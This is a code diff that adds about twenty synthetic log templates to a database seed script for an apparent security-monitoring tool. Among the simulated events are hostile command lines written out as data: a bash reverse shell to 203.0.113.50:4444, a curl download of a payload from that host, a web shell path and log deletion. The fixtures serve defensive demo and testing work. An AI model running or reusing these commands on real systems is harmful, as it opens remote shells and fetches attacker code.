@@ -590,6 +590,138 @@ async def seed() -> None:
 
         print(f"   ✅ Inserted {len(alert_ids)} alerts")
 
+        # --- Insert logs ---
+        LOG_TEMPLATES = [
+            {"category": "authentication", "type": "start", "action": "login_success",
+             "source": "auth", "user": "jsmith", "process": "sshd",
+             "src_ip": "10.0.1.15", "host": "bastion-host-05"},
+            {"category": "authentication", "type": "start", "action": "login_failure",
+             "source": "auth", "user": "root", "process": "sshd",
+             "src_ip": "203.0.113.50", "host": "bastion-host-05"},
+            {"category": "authentication", "type": "start", "action": "login_failure",
+             "source": "auth", "user": "admin", "process": "sshd",
+             "src_ip": "203.0.113.50", "host": "bastion-host-05"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "root", "process": "bash",
+             "cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
+             "src_ip": None, "host": "web-server-01"},
+            {"category": "file", "type": "creation", "action": "file_created",
+             "source": "osquery", "user": "www-data", "process": "php-fpm",
+             "file_path": "/var/www/html/shell.php", "host": "web-server-01"},
+            {"category": "network", "type": "connection", "action": "outbound_connection",
+             "source": "syslog", "user": None, "process": "curl",
+             "dst_ip": "198.51.100.23", "dst_port": 4444, "host": "web-server-01"},
+            {"category": "network", "type": "connection", "action": "outbound_connection",
+             "source": "syslog", "user": None, "process": "openssl",
+             "dst_ip": "91.189.214.7", "dst_port": 9050, "host": "dev-workstation-04"},
+            {"category": "network", "type": "connection", "action": "dns_query",
+             "source": "dns", "user": None, "process": "dnsmasq",
+             "dst_ip": None, "dst_port": 53, "host": "jenkins-ci-06"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "adevlin", "process": "sudo",
+             "cmdline": "sudo su -", "host": "dev-workstation-04"},
+            {"category": "file", "type": "modification", "action": "file_modified",
+             "source": "osquery", "user": "root", "process": "rm",
+             "file_path": "/var/log/auth.log", "host": "web-server-01"},
+            {"category": "authentication", "type": "start", "action": "login_success",
+             "source": "auth", "user": "svc_deploy", "process": "sshd",
+             "src_ip": "10.0.1.22", "host": "db-prod-02"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "svc_monitoring", "process": "python3",
+             "cmdline": "python3 /opt/monitor/health_check.py", "host": "api-gateway-03"},
+            {"category": "network", "type": "connection", "action": "outbound_connection",
+             "source": "syslog", "user": None, "process": "nginx",
+             "dst_ip": "203.0.113.50", "dst_port": 443, "host": "api-gateway-03"},
+            {"category": "file", "type": "creation", "action": "file_created",
+             "source": "osquery", "user": "root", "process": "launchctl",
+             "file_path": "/Library/LaunchDaemons/com.malicious.agent.plist", "host": "macbook-jane"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "jane", "process": "xattr",
+             "cmdline": "xattr -d com.apple.quarantine malicious_app.dmg", "host": "macbook-jane"},
+            {"category": "network", "type": "connection", "action": "data_transfer",
+             "source": "firewall", "user": None, "process": "nginx",
+             "dst_ip": "198.51.100.23", "dst_port": 443, "host": "api-gateway-03"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "root", "process": "mimikatz",
+             "host": "db-prod-02"},
+            {"category": "authentication", "type": "start", "action": "account_lockout",
+             "source": "auth", "user": "jsmith", "process": "sshd",
+             "src_ip": "45.33.32.156", "host": "bastion-host-05"},
+            {"category": "process", "type": "start", "action": "process_started",
+             "source": "osquery", "user": "root", "process": "curl",
+             "cmdline": "curl -o /tmp/payload http://203.0.113.50/payload", "host": "web-server-01"},
+            {"category": "file", "type": "modification", "action": "file_modified",
+             "source": "osquery", "user": "root", "process": "crontab",
+             "file_path": "/var/spool/cron/root", "host": "redis-cache-07"},
+        ]
+
+        log_ids = []
+        for i, lt in enumerate(LOG_TEMPLATES):
+            log_time = now - timedelta(minutes=random.randint(1, 2880), seconds=random.randint(0, 59))
+            host = lt.get("host", random.choice(HOSTS))
+            raw = {
+                "event_id": f"evt-{random.randint(10000, 99999)}",
+                "timestamp": log_time.isoformat(),
+                "host": host,
+                "source": lt["source"],
+                "category": lt["category"],
+            }
+            if lt.get("user"):
+                raw["user"] = lt["user"]
+            if lt.get("process"):
+                raw["process"] = lt["process"]
+
+            normalized = {
+                "host_name": host,
+                "event_category": lt["category"],
+                "event_type": lt["type"],
+                "event_action": lt.get("action", ""),
+                "source": lt["source"],
+            }
+            if lt.get("user"):
+                normalized["user_name"] = lt["user"]
+            if lt.get("process"):
+                normalized["process_name"] = lt["process"]
+            if lt.get("cmdline"):
+                normalized["process_cmdline"] = lt["cmdline"]
+
+            try:
+                await conn.execute(
+                    """
+                    INSERT INTO logs (
+                        time, host_name, source, event_category, event_type, event_action,
+                        user_name, process_name, process_cmdline, process_path,
+                        source_ip, destination_ip, destination_port,
+                        file_path, raw_data, normalized, enrichment
+                    ) VALUES (
+                        $1, $2, $3, $4, $5, $6, $7, $8, $9, $10,
+                        $11, $12, $13, $14, $15::jsonb, $16::jsonb, $17::jsonb
+                    )
+                    """,
+                    log_time,
+                    host,
+                    lt["source"],
+                    lt["category"],
+                    lt["type"],
+                    lt.get("action"),
+                    lt.get("user"),
+                    lt.get("process"),
+                    lt.get("cmdline"),
+                    None,  # process_path
+                    f"{lt['src_ip']}/32" if lt.get("src_ip") else None,
+                    f"{lt['dst_ip']}/32" if lt.get("dst_ip") else None,
+                    lt.get("dst_port"),
+                    lt.get("file_path"),
+                    json.dumps(raw),
+                    json.dumps(normalized),
+                    json.dumps({}),
+                )
+                log_ids.append(i)
+            except Exception as e:
+                print(f"   ⚠️  Failed to insert log {i}: {e}")
+
+        print(f"   ✅ Inserted {len(log_ids)} log entries")
+
         # --- Insert cases ---
         for i, case_tmpl in enumerate(CASES):
             case_time = now - timedelta(hours=random.randint(6, 72))
@@ -706,6 +838,7 @@ async def seed() -> None:
         print(f"   {len(alert_ids)} alerts across all severity levels")
         print(f"   {len(CASES)} cases with notes and lessons learned")
         print(f"   {len(THREAT_INTEL_ENTRIES)} threat intel entries")
+        print(f"   {len(log_ids)} log entries across {len(set(lt.get('host', '') for lt in LOG_TEMPLATES))} hosts")
 
     finally:
         await conn.close()
